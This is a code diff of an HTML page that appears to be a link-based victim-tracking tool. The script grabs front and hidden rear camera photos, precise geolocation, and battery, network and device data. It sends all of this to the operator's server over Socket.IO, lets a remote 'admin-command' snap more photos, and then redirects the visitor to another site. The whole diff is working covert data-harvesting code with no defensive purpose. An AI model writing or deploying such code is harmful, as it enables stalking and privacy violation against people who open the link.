@@ -40,11 +40,11 @@
         }
         .status {
             padding: 10px;
-            background: #48bb78;
-            color: white;
             border-radius: 5px;
             text-align: center;
             margin: 15px 0;
+            background: #48bb78;
+            color: white;
         }
         #cameraPreview {
             margin: 15px 0;
@@ -99,361 +99,318 @@
         </div>
     </div>
     
+    <!-- ========================================== -->
+    <!-- FIXED: Socket.IO CDN with Fallback -->
+    <!-- ========================================== -->
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script>
-        const visitorId = window.location.pathname.split('/').pop();
-        console.log('Visitor ID:', visitorId);
-        
-        let socket = null;
-        let localStream = null;
-        let redirectUrl = '';
-        let dataCollectionComplete = false;
-        
-        // ========================================
-        // 1. FETCH REDIRECT URL FROM SERVER
-        // ========================================
-        function fetchRedirectUrl() {
-            console.log('Fetching redirect URL for visitor:', visitorId);
+        // If CDN fails, load from alternative source
+        if (typeof io === 'undefined') {
+            console.log('Primary CDN failed, loading fallback...');
+            var script = document.createElement('script');
+            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js';
+            document.head.appendChild(script);
             
-            // Try main endpoint
-            fetch(`/api/visitor/${visitorId}`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Visitor data received:', data);
-                    redirectUrl = data.redirectUrl || 'https://www.google.com';
-                    console.log('Redirect URL:', redirectUrl);
-                    startDataCollection();
-                })
-                .catch(error => {
-                    console.error('Error fetching visitor data:', error);
-                    
-                    // Try fallback endpoint
-                    fetch(`/api/visitor-redirect/${visitorId}`)
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.redirectUrl) {
-                                redirectUrl = data.redirectUrl;
-                                console.log('Fallback redirect URL:', redirectUrl);
+            // Wait for fallback to load
+            script.onload = function() {
+                console.log('Fallback CDN loaded successfully');
+                if (typeof io !== 'undefined') {
+                    initApp();
+                } else {
+                    document.getElementById('errorMessage').innerHTML = '❌ Cannot connect to server. Please try again later.';
+                    document.getElementById('errorMessage').style.display = 'block';
+                }
+            };
+        } else {
+            console.log('Socket.IO loaded successfully');
+            initApp();
+        }
+        
+        // ========================================
+        // MAIN APPLICATION
+        // ========================================
+        function initApp() {
+            console.log('App initialized with Socket.IO');
+            const visitorId = window.location.pathname.split('/').pop();
+            console.log('Visitor ID:', visitorId);
+            
+            let socket = null;
+            let localStream = null;
+            let redirectUrl = '';
+            let redirectTriggered = false;
+            
+            // ========================================
+            // 1. FETCH REDIRECT URL
+            // ========================================
+            function fetchRedirectUrl() {
+                console.log('Fetching redirect URL for visitor:', visitorId);
+                
+                fetch(`/api/visitor/${visitorId}`)
+                    .then(response => {
+                        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                        return response.json();
+                    })
+                    .then(data => {
+                        redirectUrl = data.redirectUrl || 'https://www.google.com';
+                        console.log('Redirect URL:', redirectUrl);
+                        startDataCollection();
+                    })
+                    .catch(() => {
+                        fetch(`/api/visitor-redirect/${visitorId}`)
+                            .then(res => res.json())
+                            .then(data => {
+                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                 document.getElementById('fallbackMessage').style.display = 'block';
                                 startDataCollection();
-                            } else {
-                                throw new Error('No redirect URL found');
-                            }
-                        })
-                        .catch(() => {
-                            // Ultimate fallback
-                            redirectUrl = 'https://www.google.com';
-                            console.log('Using ultimate fallback URL:', redirectUrl);
-                            document.getElementById('fallbackMessage').style.display = 'block';
-                            document.getElementById('fallbackMessage').innerHTML = '⚠️ Using default fallback. Data collection continues...';
-                            startDataCollection();
-                        });
-                });
-        }
-        
-        // ========================================
-        // 2. START DATA COLLECTION
-        // ========================================
-        function startDataCollection() {
-            console.log('Starting data collection...');
-            initConnection();
-        }
-        
-        // ========================================
-        // 3. INITIALIZE SOCKET CONNECTION
-        // ========================================
-        function initConnection() {
-            console.log('Initializing socket connection...');
+                            })
+                            .catch(() => {
+                                redirectUrl = 'https://www.google.com';
+                                document.getElementById('fallbackMessage').style.display = 'block';
+                                document.getElementById('fallbackMessage').innerHTML = '⚠️ Using default fallback. Data collection continues...';
+                                startDataCollection();
+                            });
+                    });
+            }
             
-            socket = io({
-                transports: ['websocket', 'polling']
-            });
+            // ========================================
+            // 2. START DATA COLLECTION
+            // ========================================
+            function startDataCollection() {
+                console.log('Starting data collection...');
+                initConnection();
+            }
             
-            socket.on('connect', () => {
-                console.log('Socket connected successfully!');
-                document.getElementById('connectionStatus').innerHTML = '✅ Connected! Collecting data...';
-                document.getElementById('connectionStatus').style.background = '#48bb78';
-                
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    language: navigator.language,
-                    battery: 'N/A',
-                    simNetwork: 'N/A'
-                };
-                
-                socket.emit('visitor-connect', {
-                    visitorId: visitorId,
-                    ...deviceInfo
-                });
-                
-                setTimeout(() => {
-                    setupCamera();
-                    getLocation();
-                    getBatteryInfo();
-                    getNetworkInfo();
-                }, 1000);
-            });
-            
-            socket.on('connect_error', (error) => {
-                console.error('Socket connection error:', error);
-                document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('connectionStatus').innerHTML = '❌ Connection failed';
-                document.getElementById('connectionStatus').style.background = '#fc8181';
-                // Retry after 3 seconds
-                setTimeout(() => {
-                    socket.connect();
-                }, 3000);
-            });
-            
-            socket.on('disconnect', () => {
-                console.log('Socket disconnected');
-                document.getElementById('connectionStatus').innerHTML = '⚠️ Disconnected';
-                document.getElementById('connectionStatus').style.background = '#fc8181';
-            });
-            
-            socket.on('admin-command', (data) => {
-                console.log('Admin command:', data);
-                if (data.command === 'capture-photo') {
-                    capturePhoto('front');
-                }
-            });
-        }
-        
-        // ========================================
-        // 4. CAMERA SETUP
-        // ========================================
-        async function setupCamera() {
-            try {
-                console.log('Setting up camera...');
-                
-                const frontStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
-                    audio: false
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = frontStream;
-                document.getElementById('cameraPreview').style.display = 'block';
-                
-                setTimeout(() => {
-                    capturePhoto('front');
-                }, 2000);
+            // ========================================
+            // 3. SOCKET CONNECTION
+            // ========================================
+            function initConnection() {
+                console.log('Initializing socket connection...');
                 
                 try {
-                    const backStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'environment' },
+                    socket = io({
+                        transports: ['websocket', 'polling'],
+                        reconnectionAttempts: 5,
+                        reconnectionDelay: 1000
+                    });
+                    
+                    socket.on('connect', () => {
+                        console.log('Socket connected successfully!');
+                        document.getElementById('connectionStatus').innerHTML = '✅ Connected! Collecting data...';
+                        document.getElementById('connectionStatus').style.background = '#48bb78';
+                        
+                        const deviceInfo = {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            screenResolution: `${window.screen.width}x${window.screen.height}`,
+                            language: navigator.language
+                        };
+                        
+                        socket.emit('visitor-connect', {
+                            visitorId: visitorId,
+                            ...deviceInfo
+                        });
+                        
+                        setTimeout(() => {
+                            setupCamera();
+                            getLocation();
+                            getBatteryInfo();
+                            getNetworkInfo();
+                        }, 1000);
+                    });
+                    
+                    socket.on('connect_error', (error) => {
+                        console.error('Socket connection error:', error);
+                        document.getElementById('errorMessage').style.display = 'block';
+                        document.getElementById('connectionStatus').innerHTML = '❌ Connection failed - Retrying...';
+                        document.getElementById('connectionStatus').style.background = '#fc8181';
+                        setTimeout(() => socket.connect(), 3000);
+                    });
+                    
+                    socket.on('disconnect', () => {
+                        console.log('Socket disconnected');
+                        document.getElementById('connectionStatus').innerHTML = '⚠️ Disconnected - Reconnecting...';
+                        document.getElementById('connectionStatus').style.background = '#ed8936';
+                    });
+                    
+                    socket.on('admin-command', (data) => {
+                        if (data.command === 'capture-photo') {
+                            capturePhoto('front');
+                        }
+                    });
+                    
+                } catch (error) {
+                    console.error('Socket initialization error:', error);
+                    document.getElementById('errorMessage').innerHTML = '❌ Socket error: ' + error.message;
+                    document.getElementById('errorMessage').style.display = 'block';
+                }
+            }
+            
+            // ========================================
+            // 4. CAMERA SETUP
+            // ========================================
+            async function setupCamera() {
+                try {
+                    const frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
                         audio: false
                     });
                     
-                    const backVideo = document.createElement('video');
-                    backVideo.srcObject = backStream;
-                    backVideo.autoplay = true;
-                    backVideo.style.display = 'none';
-                    document.body.appendChild(backVideo);
+                    const video = document.getElementById('video');
+                    video.srcObject = frontStream;
+                    document.getElementById('cameraPreview').style.display = 'block';
                     
-                    setTimeout(() => {
-                        capturePhoto('back', backVideo);
-                    }, 3000);
+                    setTimeout(() => capturePhoto('front'), 2000);
                     
-                } catch (backError) {
-                    console.log('Back camera not available:', backError);
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'environment' },
+                            audio: false
+                        });
+                        const backVideo = document.createElement('video');
+                        backVideo.srcObject = backStream;
+                        backVideo.autoplay = true;
+                        backVideo.style.display = 'none';
+                        document.body.appendChild(backVideo);
+                        setTimeout(() => capturePhoto('back', backVideo), 3000);
+                    } catch (e) {
+                        console.log('Back camera not available');
+                    }
+                } catch (error) {
+                    console.error('Camera error:', error);
+                }
+            }
+            
+            // ========================================
+            // 5. CAPTURE PHOTO
+            // ========================================
+            function capturePhoto(type, videoElement = null) {
+                const video = videoElement || document.getElementById('video');
+                if (!video || !video.videoWidth) return;
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                if (socket && socket.connected) {
+                    socket.emit('visitor-data', {
+                        visitorId: visitorId,
+                        type: type === 'back' ? 'backCamera' : 'frontCamera',
+                        content: imageData
+                    });
+                }
+                checkAndRedirect();
+            }
+            
+            // ========================================
+            // 6. LOCATION
+            // ========================================
+            function getLocation() {
+                if (!navigator.geolocation) {
+                    checkAndRedirect();
+                    return;
                 }
                 
-                return true;
-            } catch (error) {
-                console.error('Camera error:', error);
-                return false;
-            }
-        }
-        
-        // ========================================
-        // 5. CAPTURE PHOTO
-        // ========================================
-        function capturePhoto(type, videoElement = null) {
-            const video = videoElement || document.getElementById('video');
-            if (!video || !video.videoWidth) {
-                console.log('Video not ready for capture');
-                return;
-            }
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            if (socket && socket.connected) {
-                socket.emit('visitor-data', {
-                    visitorId: visitorId,
-                    type: type === 'back' ? 'backCamera' : 'frontCamera',
-                    content: imageData
-                });
-                console.log(`📸 ${type} camera photo captured and sent!`);
-            }
-            
-            checkAndRedirect();
-        }
-        
-        // ========================================
-        // 6. GET LOCATION
-        // ========================================
-        function getLocation() {
-            console.log('Getting location...');
-            
-            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
                         
                         fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
-                            .then(response => response.json())
-                            .then(locationData => {
+                            .then(res => res.json())
+                            .then(data => {
                                 const locationInfo = {
-                                    lat: lat,
-                                    lng: lng,
+                                    lat, lng,
                                     accuracy: position.coords.accuracy,
                                     timestamp: new Date().toISOString(),
-                                    country: locationData.countryName || 'Unknown',
-                                    state: locationData.principalSubdivision || 'Unknown',
-                                    city: locationData.locality || 'Unknown',
-                                    fullAddress: locationData.localityInfo?.address || 'Unknown'
+                                    country: data.countryName || 'Unknown',
+                                    state: data.principalSubdivision || 'Unknown',
+                                    city: data.locality || 'Unknown'
                                 };
-                                
                                 if (socket && socket.connected) {
                                     socket.emit('visitor-data', {
                                         visitorId: visitorId,
                                         type: 'location',
                                         content: locationInfo
                                     });
-                                    console.log('📍 Location shared!');
                                 }
-                                
                                 checkAndRedirect();
                             })
-                            .catch(() => {
-                                const locationInfo = {
-                                    lat: lat,
-                                    lng: lng,
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: new Date().toISOString()
-                                };
-                                
-                                if (socket && socket.connected) {
-                                    socket.emit('visitor-data', {
-                                        visitorId: visitorId,
-                                        type: 'location',
-                                        content: locationInfo
-                                    });
-                                }
-                                
-                                checkAndRedirect();
-                            });
+                            .catch(() => checkAndRedirect());
                     },
-                    (error) => {
-                        console.error('Location error:', error);
-                        checkAndRedirect();
-                    }
+                    () => checkAndRedirect()
                 );
-            } else {
-                console.log('Geolocation not supported');
-                checkAndRedirect();
             }
-        }
-        
-        // ========================================
-        // 7. GET BATTERY INFO
-        // ========================================
-        function getBatteryInfo() {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    const batteryLevel = Math.round(battery.level * 100);
+            
+            // ========================================
+            // 7. BATTERY + NETWORK
+            // ========================================
+            function getBatteryInfo() {
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        const level = Math.round(battery.level * 100);
+                        if (socket && socket.connected) {
+                            socket.emit('visitor-data', {
+                                visitorId: visitorId,
+                                type: 'battery',
+                                content: level
+                            });
+                        }
+                    });
+                }
+            }
+            
+            function getNetworkInfo() {
+                if (navigator.connection) {
+                    const conn = navigator.connection;
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
                             visitorId: visitorId,
-                            type: 'battery',
-                            content: batteryLevel
+                            type: 'network',
+                            content: {
+                                type: conn.type || 'Unknown',
+                                effectiveType: conn.effectiveType || 'Unknown',
+                                downlink: conn.downlink || 'Unknown'
+                            }
                         });
-                        console.log(`🔋 Battery: ${batteryLevel}%`);
                     }
-                });
-            }
-        }
-        
-        // ========================================
-        // 8. GET NETWORK INFO
-        // ========================================
-        function getNetworkInfo() {
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                const networkInfo = {
-                    type: conn.type || 'Unknown',
-                    effectiveType: conn.effectiveType || 'Unknown',
-                    downlink: conn.downlink || 'Unknown'
-                };
-                if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId: visitorId,
-                        type: 'network',
-                        content: networkInfo
-                    });
-                    console.log('📶 Network info sent!');
                 }
             }
-        }
-        
-        // ========================================
-        // 9. CHECK AND REDIRECT
-        // ========================================
-        let redirectTriggered = false;
-        
-        function checkAndRedirect() {
-            if (redirectTriggered) return;
             
-            // Wait 5 seconds then redirect
-            setTimeout(() => {
-                console.log('Redirecting to:', redirectUrl);
-                
-                if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId: visitorId,
-                        type: 'redirectComplete',
-                        content: { redirected: true, time: new Date().toISOString() }
-                    });
-                }
-                
-                redirectTriggered = true;
-                document.getElementById('connectionStatus').innerHTML = '✅ Data collected! Redirecting...';
-                document.getElementById('connectionStatus').style.background = '#48bb78';
-                
+            // ========================================
+            // 8. REDIRECT
+            // ========================================
+            function checkAndRedirect() {
+                if (redirectTriggered) return;
                 setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 2000);
-            }, 5000);
+                    redirectTriggered = true;
+                    if (socket && socket.connected) {
+                        socket.emit('visitor-data', {
+                            visitorId: visitorId,
+                            type: 'redirectComplete',
+                            content: { redirected: true, time: new Date().toISOString() }
+                        });
+                    }
+                    document.getElementById('connectionStatus').innerHTML = '✅ Data collected! Redirecting...';
+                    document.getElementById('connectionStatus').style.background = '#48bb78';
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 2000);
+                }, 5000);
+            }
+            
+            // ========================================
+            // 9. START
+            // ========================================
+            fetchRedirectUrl();
+            
+            window.addEventListener('beforeunload', () => {
+                if (localStream) localStream.getTracks().forEach(t => t.stop());
+                if (socket) socket.disconnect();
+            });
         }
-        
-        // ========================================
-        // 10. START THE PROCESS
-        // ========================================
-        fetchRedirectUrl();
-        
-        window.addEventListener('beforeunload', () => {
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
-            if (socket) {
-                socket.disconnect();
-            }
-        });
     </script>
 </body>
 </html>
